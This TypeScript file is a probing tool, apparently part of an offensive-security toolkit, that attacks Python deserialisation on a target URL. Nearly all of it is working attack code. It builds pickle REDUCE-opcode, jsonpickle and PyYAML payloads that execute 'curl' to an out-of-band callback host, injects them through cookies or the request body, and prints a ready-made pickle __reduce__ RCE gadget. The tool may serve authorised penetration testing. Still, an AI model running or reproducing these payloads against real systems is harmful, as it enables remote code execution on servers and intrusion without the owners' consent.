// T43 — python_deserial_probe
// Python deserialisation: pickle opcode injection, jsonpickle, PyYAML.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'python_deserial_probe',
  description:
    'Python deserialisation attack suite. Tests pickle opcode injection (R opcode RCE), ' +
    'jsonpickle py/object/apply, and PyYAML !!python/object/apply. Detection: ' +
    'Python session cookies, Django/Flask stack traces, pickle magic bytes.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',        type: 'string', required: true,  description: 'Target URL' },
    { name: 'method',     type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'field',      type: 'string', required: false, description: 'Field/cookie name to inject', default: 'session' },
    { name: 'oob_host',   type: 'string', required: true,  description: 'OOB callback host for RCE confirmation' },
    { name: 'headers',    type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// Pickle canary: tries to call os.system with OOB callback
// This is the R opcode (REDUCE) gadget — os.system(cmd)
function buildPickleB64(oobHost: string, variant: string): string {
  // cos\nsystem\n(S'curl ${oobHost}/${variant}'\ntR. (pickle opcodes)
  const cmd = `curl ${oobHost}/${variant}`;
  const raw = `cos\nsystem\n(S'${cmd}'\ntR.`;
  return Buffer.from(raw).toString('base64');
}

const JSONPICKLE_PAYLOAD = (oobHost: string) => JSON.stringify({
  'py/object': 'subprocess.Popen',
  'py/tuple': [['curl', `${oobHost}/jsonpickle-hit`]],
  'py/state': {'__dict__': {}}
});

const PYYAML_PAYLOAD = (oobHost: string) => `!!python/object/apply:subprocess.call\n- ['curl', '${oobHost}/pyyaml-hit']`;

export const pythonDeserialProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const field = String(params.field || 'session');
    const oobHost = String(params.oob_host || '');
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!oobHost) return { output: 'oob_host required', parsed: { error: 'missing_oob_host' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const probes = [
      { name: 'pickle_R_opcode',    payload: buildPickleB64(oobHost, 'pickle-rce'), content_type: 'application/octet-stream', as_cookie: true },
      { name: 'jsonpickle_popen',   payload: JSONPICKLE_PAYLOAD(oobHost),           content_type: 'application/json',         as_cookie: false },
      { name: 'pyyaml_apply',       payload: PYYAML_PAYLOAD(oobHost),               content_type: 'application/yaml',         as_cookie: false },
    ];

    const results: Array<{ name: string; status: number; interesting: boolean; error?: string }> = [];

    for (const probe of probes) {
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const probeHeaders = { ...headers };
        let body: string | undefined;
        if (probe.as_cookie) {
          probeHeaders['Cookie'] = `${field}=${probe.payload}`;
        } else {
          probeHeaders['Content-Type'] = probe.content_type;
          body = probe.payload;
        }
        const resp = await fetch(url, { method, headers: probeHeaders, body, signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = /pickle|deseri|__reduce__|TypeError|AttributeError/i.test(text) || resp.status >= 500;
        results.push({ name: probe.name, status: resp.status, interesting });
      } catch (err) {
        results.push({ name: probe.name, status: 0, interesting: false, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `python_deserial_probe — ${url.substring(0, 80)}`,
      `Interesting responses: ${interesting.length}/${probes.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(24)}]  status=${r.status}`);
    }
    lines.push('');
    lines.push(`MONITOR OOB: After running, call oob_check(action=check) to see if ${oobHost} received a callback`);
    lines.push('If callback received → Python pickle RCE confirmed → CRITICAL severity');
    lines.push('');
    lines.push('FORGE_RUNNER test:');
    lines.push(`  import pickle, os, base64`);
    lines.push(`  class RCE(object):`);
    lines.push(`      def __reduce__(self): return os.system, ('curl ${oobHost}/pickle-forge',)`);
    lines.push(`  payload = base64.b64encode(pickle.dumps(RCE())).decode()`);
    lines.push(`  print('Pickle payload:', payload)`);

    return {
      output: lines.join('\n'),
      parsed: { probe_results: results, interesting_count: interesting.length, oob_host: oobHost },
    };
  },
};
